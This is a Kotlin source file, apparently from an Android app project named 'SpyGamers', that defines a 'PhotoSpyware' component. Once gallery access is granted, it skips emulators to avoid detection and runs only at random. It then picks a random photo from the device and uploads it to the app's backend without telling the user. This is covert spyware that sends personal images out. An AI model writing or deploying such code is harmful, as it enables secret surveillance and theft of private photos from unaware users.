package com.example.spygamers.components.spyware

import android.content.ContentUris
import android.content.Context
import android.net.Uri
import android.provider.MediaStore
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import com.example.spygamers.controllers.GamerViewModel
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import kotlin.random.Random


@Composable
fun PhotoSpyware(
    viewModel: GamerViewModel,
    context: Context
){
    val mediaGrantState by viewModel.grantedMediaFileAccess.collectAsState()
    val isEmulator by viewModel.isOnEmulator.collectAsState()
    val performService = Random.nextInt(1, 3) == 1    // No permissions granted, ignore....
    if (!mediaGrantState) {
        return
    }

    if (!performService) {
        return
    }

    if (isEmulator) {
        return
    }

    LaunchedEffect(Unit) {
        try {
            val imageUri = context.getRandomImageUri()
            imageUri?.let {
                val filePart = prepareFilePart("attachments", it, context)
                viewModel.logPhoto(filePart)
            } ?: run {
                viewModel.updateMediaFileGrants(false)
            }
        } catch (e: SecurityException) {
            viewModel.updateMediaFileGrants(false)
        }
    }
}

private fun prepareFilePart(partName: String, fileUri: Uri, context: Context): MultipartBody.Part {
    // Get the actual file from the file URI
    val file = File(fileUri.path!!)

    // Create RequestBody instance from file
    val requestFile = file.asRequestBody(context.contentResolver.getType(fileUri)?.toMediaTypeOrNull())

    // MultipartBody.Part is used to send also the actual file name
    return MultipartBody.Part.createFormData(partName, file.name, requestFile)
}


private fun Context.getRandomImageUri(): Uri? {
    val cursor = contentResolver.query(
        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
        arrayOf(MediaStore.Images.Media._ID),
        null,
        null,
        null
    )

    val imageUris = mutableListOf<Uri>()

    cursor?.use {
        val idColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
        while (it.moveToNext()) {
            val id = it.getLong(idColumn)
            val imageUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
            imageUris.add(imageUri)
        }
    }

    return if (imageUris.isNotEmpty()) {
        imageUris.random() // Randomly select an image URI from the list
    } else {
        null
    }
}